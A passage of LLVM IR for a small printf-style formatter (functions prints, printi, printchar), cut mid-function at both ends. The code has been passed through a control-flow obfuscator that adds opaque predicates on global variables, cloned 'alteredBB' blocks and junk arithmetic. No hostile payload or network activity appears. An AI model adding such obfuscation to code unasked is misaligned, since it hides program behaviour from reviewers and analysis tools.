  br label %452

; <label>:447:                                    ; preds = %436
  %448 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %437, i32 0, i32 2
  %449 = load i8*, i8** %448, align 8
  %450 = bitcast i8* %449 to i32*
  %451 = getelementptr i8, i8* %449, i32 8
  store i8* %451, i8** %448, align 8
  br label %452

; <label>:452:                                    ; preds = %447, %441
  %453 = phi i32* [ %445, %441 ], [ %450, %447 ]
  %454 = load i32, i32* %453, align 4
  %455 = trunc i32 %454 to i8
  %456 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %455, i8* %456, align 1
  %457 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %457, align 1
  %458 = load i8**, i8*** %4, align 8
  %459 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %460 = load i32, i32* %7, align 4
  %461 = load i32, i32* %8, align 4
  %462 = call i32 @prints(i8** %458, i8* %459, i32 %460, i32 %461)
  %463 = load i32, i32* %9, align 4
  %464 = add nsw i32 %463, %462
  store i32 %464, i32* %9, align 4
  br label %491

; <label>:465:                                    ; preds = %431
  br label %490

; <label>:466:                                    ; preds = %17
  br label %467

; <label>:467:                                    ; preds = %466, %67
  %468 = load i32, i32* @x.7
  %469 = load i32, i32* @y.8
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %467
  %476 = load i8**, i8*** %4, align 8
  %477 = load i8*, i8** %5, align 8
  %478 = load i8, i8* %477, align 1
  %479 = zext i8 %478 to i32
  call void @printchar(i8** %476, i32 %479)
  %480 = load i32, i32* %9, align 4
  %481 = add nsw i32 %480, 1
  store i32 %481, i32* %9, align 4
  %482 = load i32, i32* @x.7
  %483 = load i32, i32* @y.8
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBBpart250, label %originalBB46alteredBB

originalBBpart250:                                ; preds = %originalBB46
  br label %490

; <label>:490:                                    ; preds = %originalBBpart250, %465
  br label %491

; <label>:491:                                    ; preds = %490, %452, %423, %377, %347, %301, %240
  %492 = load i8*, i8** %5, align 8
  %493 = getelementptr inbounds i8, i8* %492, i32 1
  store i8* %493, i8** %5, align 8
  br label %12

; <label>:494:                                    ; preds = %originalBBpart2, %12
  %495 = load i8**, i8*** %4, align 8
  %496 = icmp ne i8** %495, null
  br i1 %496, label %497, label %516

; <label>:497:                                    ; preds = %494
  %498 = load i32, i32* @x.7
  %499 = load i32, i32* @y.8
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %497
  %506 = load i8**, i8*** %4, align 8
  %507 = load i8*, i8** %506, align 8
  store i8 0, i8* %507, align 1
  %508 = load i32, i32* @x.7
  %509 = load i32, i32* @y.8
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %516

; <label>:516:                                    ; preds = %originalBBpart254, %494
  %517 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %518 = bitcast %struct.__va_list_tag* %517 to i8*
  call void @llvm.va_end(i8* %518)
  %519 = load i32, i32* %9, align 4
  ret i32 %519

originalBBalteredBB:                              ; preds = %originalBB, %29
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %520 = load i8*, i8** %5, align 8
  %521 = load i8, i8* %520, align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %524 = load i8*, i8** %5, align 8
  %525 = load i8, i8* %524, align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 45
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  %528 = load i8*, i8** %5, align 8
  %529 = load i8, i8* %528, align 1
  %530 = zext i8 %529 to i32
  %531 = icmp sle i32 %530, 57
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %181
  %532 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %533 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 8
  %535 = icmp ule i32 %534, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %223
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %247
  %536 = load i8*, i8** %5, align 8
  %537 = load i8, i8* %536, align 1
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 100
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %274
  %540 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %270, i32 0, i32 3
  %541 = load i8*, i8** %540, align 8
  %542 = getelementptr i8, i8* %541, i32 %272
  %543 = bitcast i8* %542 to i32*
  %_ = sub i32 0, %272
  %gen = add i32 %_, 8
  %544 = add i32 %272, 8
  store i32 %544, i32* %271, align 8
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %320
  %545 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %316, i32 0, i32 3
  %546 = load i8*, i8** %545, align 8
  %547 = getelementptr i8, i8* %546, i32 %318
  %548 = bitcast i8* %547 to i32*
  %549 = add i32 %318, 8
  store i32 %549, i32* %317, align 8
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %390
  %550 = load i8**, i8*** %4, align 8
  %551 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %552 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %551, i32 0, i32 0
  %553 = load i32, i32* %552, align 8
  %554 = icmp ule i32 %553, 40
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %467
  %555 = load i8**, i8*** %4, align 8
  %556 = load i8*, i8** %5, align 8
  %557 = load i8, i8* %556, align 1
  %558 = zext i8 %557 to i32
  call void @printchar(i8** %555, i32 %558)
  %559 = load i32, i32* %9, align 4
  %_47 = sub i32 0, %559
  %gen48 = add i32 %_47, 1
  %560 = add nsw i32 %559, 1
  store i32 %560, i32* %9, align 4
  br label %originalBB46

originalBB52alteredBB:                            ; preds = %originalBB52, %497
  %561 = load i8**, i8*** %4, align 8
  %562 = load i8*, i8** %561, align 8
  store i8 0, i8* %562, align 1
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %122

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %originalBBpart27, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %59

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* @x.9
  %23 = load i32, i32* @y.10
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* %11, align 4
  %31 = add nsw i32 %30, 1
  store i32 %31, i32* %11, align 4
  %32 = load i32, i32* @x.9
  %33 = load i32, i32* @y.10
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %originalBBpart2
  %41 = load i32, i32* @x.9
  %42 = load i32, i32* @y.10
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %40
  %49 = load i8*, i8** %12, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %12, align 8
  %51 = load i32, i32* @x.9
  %52 = load i32, i32* @y.10
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %17

; <label>:59:                                     ; preds = %17
  %60 = load i32, i32* %11, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp sge i32 %60, %61
  br i1 %62, label %63, label %80

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @x.9
  %65 = load i32, i32* @y.10
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %63
  store i32 0, i32* %7, align 4
  %72 = load i32, i32* @x.9
  %73 = load i32, i32* @y.10
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %84

; <label>:80:                                     ; preds = %59
  %81 = load i32, i32* %11, align 4
  %82 = load i32, i32* %7, align 4
  %83 = sub nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  br label %84

; <label>:84:                                     ; preds = %80, %originalBBpart211
  %85 = load i32, i32* @x.9
  %86 = load i32, i32* @y.10
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %84
  %93 = load i32, i32* %8, align 4
  %94 = and i32 %93, 2
  %95 = icmp ne i32 %94, 0
  %96 = load i32, i32* @x.9
  %97 = load i32, i32* @y.10
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart230, label %originalBB13alteredBB

originalBBpart230:                                ; preds = %originalBB13
  br i1 %95, label %104, label %105

; <label>:104:                                    ; preds = %originalBBpart230
  store i32 48, i32* %10, align 4
  br label %105

; <label>:105:                                    ; preds = %104, %originalBBpart230
  %106 = load i32, i32* @x.9
  %107 = load i32, i32* @y.10
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %105
  %114 = load i32, i32* @x.9
  %115 = load i32, i32* @y.10
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %122

; <label>:122:                                    ; preds = %originalBBpart234, %4
  %123 = load i32, i32* @x.9
  %124 = load i32, i32* @y.10
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %122
  %131 = load i32, i32* %8, align 4
  %132 = and i32 %131, 1
  %133 = icmp ne i32 %132, 0
  %134 = load i32, i32* @x.9
  %135 = load i32, i32* @y.10
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart244, label %originalBB36alteredBB

originalBBpart244:                                ; preds = %originalBB36
  br i1 %133, label %155, label %142

; <label>:142:                                    ; preds = %originalBBpart244
  br label %143

; <label>:143:                                    ; preds = %151, %142
  %144 = load i32, i32* %7, align 4
  %145 = icmp sgt i32 %144, 0
  br i1 %145, label %146, label %154

; <label>:146:                                    ; preds = %143
  %147 = load i8**, i8*** %5, align 8
  %148 = load i32, i32* %10, align 4
  call void @printchar(i8** %147, i32 %148)
  %149 = load i32, i32* %9, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %9, align 4
  br label %151

; <label>:151:                                    ; preds = %146
  %152 = load i32, i32* %7, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %7, align 4
  br label %143

; <label>:154:                                    ; preds = %143
  br label %155

; <label>:155:                                    ; preds = %154, %originalBBpart244
  %156 = load i32, i32* @x.9
  %157 = load i32, i32* @y.10
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %155
  %164 = load i32, i32* @x.9
  %165 = load i32, i32* @y.10
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %172

; <label>:172:                                    ; preds = %originalBBpart252, %originalBBpart248
  %173 = load i8*, i8** %6, align 8
  %174 = load i8, i8* %173, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %202

; <label>:176:                                    ; preds = %172
  %177 = load i8**, i8*** %5, align 8
  %178 = load i8*, i8** %6, align 8
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  call void @printchar(i8** %177, i32 %180)
  %181 = load i32, i32* %9, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %9, align 4
  br label %183

; <label>:183:                                    ; preds = %176
  %184 = load i32, i32* @x.9
  %185 = load i32, i32* @y.10
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %183
  %192 = load i8*, i8** %6, align 8
  %193 = getelementptr inbounds i8, i8* %192, i32 1
  store i8* %193, i8** %6, align 8
  %194 = load i32, i32* @x.9
  %195 = load i32, i32* @y.10
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %172

; <label>:202:                                    ; preds = %172
  br label %203

; <label>:203:                                    ; preds = %211, %202
  %204 = load i32, i32* %7, align 4
  %205 = icmp sgt i32 %204, 0
  br i1 %205, label %206, label %214

; <label>:206:                                    ; preds = %203
  %207 = load i8**, i8*** %5, align 8
  %208 = load i32, i32* %10, align 4
  call void @printchar(i8** %207, i32 %208)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %209, 1
  store i32 %210, i32* %9, align 4
  br label %211

; <label>:211:                                    ; preds = %206
  %212 = load i32, i32* %7, align 4
  %213 = add nsw i32 %212, -1
  store i32 %213, i32* %7, align 4
  br label %203

; <label>:214:                                    ; preds = %203
  %215 = load i32, i32* %9, align 4
  ret i32 %215

originalBBalteredBB:                              ; preds = %originalBB, %21
  %216 = load i32, i32* %11, align 4
  %_ = sub i32 %216, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %216
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 %216, 1
  %gen4 = mul i32 %_3, 1
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %11, align 4
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %40
  %218 = load i8*, i8** %12, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %12, align 8
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %63
  store i32 0, i32* %7, align 4
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %84
  %220 = load i32, i32* %8, align 4
  %_14 = sub i32 0, %220
  %gen15 = add i32 %_14, 2
  %_16 = sub i32 0, %220
  %gen17 = add i32 %_16, 2
  %_18 = sub i32 %220, 2
  %gen19 = mul i32 %_18, 2
  %_20 = sub i32 0, %220
  %gen21 = add i32 %_20, 2
  %_22 = shl i32 %220, 2
  %_23 = sub i32 %220, 2
  %gen24 = mul i32 %_23, 2
  %_25 = sub i32 0, %220
  %gen26 = add i32 %_25, 2
  %_27 = shl i32 %220, 2
  %221 = and i32 %220, 2
  %222 = icmp ne i32 %221, 0
  br label %originalBB13

originalBB32alteredBB:                            ; preds = %originalBB32, %105
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %122
  %223 = load i32, i32* %8, align 4
  %_37 = sub i32 %223, 1
  %gen38 = mul i32 %_37, 1
  %_39 = sub i32 0, %223
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 0, %223
  %gen42 = add i32 %_41, 1
  %224 = and i32 %223, 1
  %225 = icmp ne i32 %224, 0
  br label %originalBB36

originalBB46alteredBB:                            ; preds = %originalBB46, %155
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %183
  %226 = load i8*, i8** %6, align 8
  %227 = getelementptr inbounds i8, i8* %226, i32 1
  store i8* %227, i8** %6, align 8
  br label %originalBB50
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %134

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %61

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.11
  %41 = load i32, i32* @y.12
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i32, i32* %10, align 4
  %49 = icmp slt i32 %48, 0
  %50 = load i32, i32* @x.11
  %51 = load i32, i32* @y.12
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %61

; <label>:58:                                     ; preds = %originalBBpart2
  store i32 1, i32* %19, align 4
  %59 = load i32, i32* %10, align 4
  %60 = sub nsw i32 0, %59
  store i32 %60, i32* %21, align 4
  br label %61

; <label>:61:                                     ; preds = %58, %originalBBpart2, %36, %33
  %62 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %63 = getelementptr inbounds i8, i8* %62, i64 12
  %64 = getelementptr inbounds i8, i8* %63, i64 -1
  store i8* %64, i8** %17, align 8
  %65 = load i8*, i8** %17, align 8
  store i8 0, i8* %65, align 1
  br label %66

; <label>:66:                                     ; preds = %81, %61
  %67 = load i32, i32* %21, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %90

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* %21, align 4
  %71 = load i32, i32* %11, align 4
  %72 = urem i32 %70, %71
  store i32 %72, i32* %18, align 4
  %73 = load i32, i32* %18, align 4
  %74 = icmp sge i32 %73, 10
  br i1 %74, label %75, label %81

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* %15, align 4
  %77 = sub nsw i32 %76, 48
  %78 = sub nsw i32 %77, 10
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, %78
  store i32 %80, i32* %18, align 4
  br label %81

; <label>:81:                                     ; preds = %75, %69
  %82 = load i32, i32* %18, align 4
  %83 = add nsw i32 %82, 48
  %84 = trunc i32 %83 to i8
  %85 = load i8*, i8** %17, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 -1
  store i8* %86, i8** %17, align 8
  store i8 %84, i8* %86, align 1
  %87 = load i32, i32* %11, align 4
  %88 = load i32, i32* %21, align 4
  %89 = udiv i32 %88, %87
  store i32 %89, i32* %21, align 4
  br label %66

; <label>:90:                                     ; preds = %66
  %91 = load i32, i32* %19, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %110

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %13, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %96, label %106

; <label>:96:                                     ; preds = %93
  %97 = load i32, i32* %14, align 4
  %98 = and i32 %97, 2
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %100, label %106

; <label>:100:                                    ; preds = %96
  %101 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %101, i32 45)
  %102 = load i32, i32* %20, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %20, align 4
  %104 = load i32, i32* %13, align 4
  %105 = add nsw i32 %104, -1
  store i32 %105, i32* %13, align 4
  br label %109

; <label>:106:                                    ; preds = %96, %93
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 -1
  store i8* %108, i8** %17, align 8
  store i8 45, i8* %108, align 1
  br label %109

; <label>:109:                                    ; preds = %106, %100
  br label %110

; <label>:110:                                    ; preds = %109, %90
  %111 = load i32, i32* @x.11
  %112 = load i32, i32* @y.12
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %110
  %119 = load i32, i32* %20, align 4
  %120 = load i8**, i8*** %9, align 8
  %121 = load i8*, i8** %17, align 8
  %122 = load i32, i32* %13, align 4
  %123 = load i32, i32* %14, align 4
  %124 = call i32 @prints(i8** %120, i8* %121, i32 %122, i32 %123)
  %125 = add nsw i32 %119, %124
  store i32 %125, i32* %8, align 4
  %126 = load i32, i32* @x.11
  %127 = load i32, i32* @y.12
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br label %134

; <label>:134:                                    ; preds = %originalBBpart28, %25
  %135 = load i32, i32* @x.11
  %136 = load i32, i32* @y.12
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %134
  %143 = load i32, i32* %8, align 4
  %144 = load i32, i32* @x.11
  %145 = load i32, i32* @y.12
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %143

originalBBalteredBB:                              ; preds = %originalBB, %39
  %152 = load i32, i32* %10, align 4
  %153 = icmp slt i32 %152, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %110
  %154 = load i32, i32* %20, align 4
  %155 = load i8**, i8*** %9, align 8
  %156 = load i8*, i8** %17, align 8
  %157 = load i32, i32* %13, align 4
  %158 = load i32, i32* %14, align 4
  %159 = call i32 @prints(i8** %155, i8* %156, i32 %157, i32 %158)
  %_ = sub i32 %154, %159
  %gen = mul i32 %_, %159
  %_2 = sub i32 %154, %159
  %gen3 = mul i32 %_2, %159
  %_4 = sub i32 %154, %159
  %gen5 = mul i32 %_4, %159
  %_6 = shl i32 %154, %159
  %160 = add nsw i32 %154, %159
  store i32 %160, i32* %8, align 4
  br label %originalBB1

originalBB10alteredBB:                            ; preds = %originalBB10, %134
  %161 = load i32, i32* %8, align 4
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = load i32, i32* @x.13
  %4 = load i32, i32* @y.14
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  store i8** %0, i8*** %11, align 8
  store i32 %1, i32* %12, align 4
  %13 = load i8**, i8*** %11, align 8
  %14 = icmp ne i8** %13, null
  %15 = load i32, i32* @x.13
  %16 = load i32, i32* @y.14
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %31

; <label>:23:                                     ; preds = %originalBBpart2
